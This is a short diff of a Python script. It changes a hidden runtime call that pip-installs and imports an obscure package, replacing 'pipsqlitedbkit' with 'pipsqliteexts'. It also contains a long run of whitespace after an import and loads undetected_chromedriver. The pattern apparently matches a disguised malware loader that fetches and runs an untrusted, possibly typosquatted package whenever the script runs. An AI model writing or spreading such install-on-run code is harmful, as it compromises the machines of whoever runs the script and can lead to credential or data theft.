@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlitedbkit")
-import pipsqlitedbkit
+os.system("pip install pipsqliteexts")
+import pipsqliteexts
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
